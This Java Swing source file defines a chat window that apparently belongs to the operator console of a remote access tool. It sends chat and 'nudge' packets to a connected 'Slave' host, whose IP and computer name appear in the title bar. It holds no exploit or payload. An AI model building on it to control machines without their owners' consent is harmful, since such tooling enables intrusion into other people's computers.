package com.redpois0n.ui.frames;

import java.awt.Color;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.HashMap;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextField;
import javax.swing.JTextPane;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import javax.swing.border.EmptyBorder;
import javax.swing.text.AttributeSet;
import javax.swing.text.SimpleAttributeSet;
import javax.swing.text.StyleConstants;
import javax.swing.text.StyleContext;

import com.redpois0n.Slave;
import com.redpois0n.packets.incoming.PacketBuilder;
import com.redpois0n.packets.outgoing.Header;

@SuppressWarnings("serial")
public class FrameRemoteChat extends BaseFrame {

	private JPanel contentPane;
	public Slave slave;
	public static HashMap<Slave, FrameRemoteChat> instances = new HashMap<Slave, FrameRemoteChat>();
	public JTextField txtMsg;
	public JTextPane txtChat;

	public FrameRemoteChat(Slave slave) {
		super();
		setTitle("Chat - " + slave.getIP() + " - " + slave.getComputerName());
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteChat.class.getResource("/icons/chat.png")));
		this.slave = slave;
		final Slave sl = slave;
		instances.put(slave, this);
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				exit();
			}
		});
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 450, 300);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		txtMsg = new JTextField();
		txtMsg.addKeyListener(new KeyAdapter() {
			@Override
			public void keyPressed(KeyEvent arg0) {
				if (arg0.getKeyCode() == KeyEvent.VK_ENTER) {
					send();
				}
			}
		});
		txtMsg.setColumns(10);

		JButton btnSend = new JButton("Send");
		btnSend.setIcon(new ImageIcon(FrameRemoteChat.class.getResource("/icons/right.png")));
		btnSend.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				send();
			}
		});

		JButton btnNudge = new JButton("Nudge");
		btnNudge.setIcon(new ImageIcon(FrameRemoteChat.class.getResource("/icons/nudge.png")));
		btnNudge.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				sl.addToSendQueue(Header.CHAT_NUDGE);
			}
		});
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING).addGroup(gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(Alignment.TRAILING, gl_contentPane.createSequentialGroup().addComponent(txtMsg, GroupLayout.DEFAULT_SIZE, 265, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnSend, GroupLayout.PREFERRED_SIZE, 83, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnNudge).addPreferredGap(ComponentPlacement.RELATED)).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 423, Short.MAX_VALUE)).addGap(1)));
		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 208, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(txtMsg, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(btnNudge).addComponent(btnSend)).addGap(15)));

		txtChat = new JTextPane();
		scrollPane.setViewportView(txtChat);
		contentPane.setLayout(gl_contentPane);

		slave.addToSendQueue(Header.CHAT_START);
	}

	public void send() {
		try {
			if (txtMsg.getText().length() > 0) {
				slave.addToSendQueue(new PacketBuilder(Header.CHAT, new String[] { "-c " + txtMsg.getText().trim() }));
				
				StyleContext sc = StyleContext.getDefaultStyleContext();
				AttributeSet set = sc.addAttribute(SimpleAttributeSet.EMPTY, StyleConstants.Foreground, Color.blue);
				txtChat.getDocument().insertString(txtChat.getDocument().getLength(), "You: " + txtMsg.getText().trim() + "\n", set);
				txtMsg.setText("");
				txtChat.setSelectionEnd(txtChat.getText().length());
				txtChat.setSelectionStart(txtChat.getText().length());
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public void exit() {
		slave.addToSendQueue(Header.CHAT_END);
		instances.remove(slave);
		slave = null;
	}
}
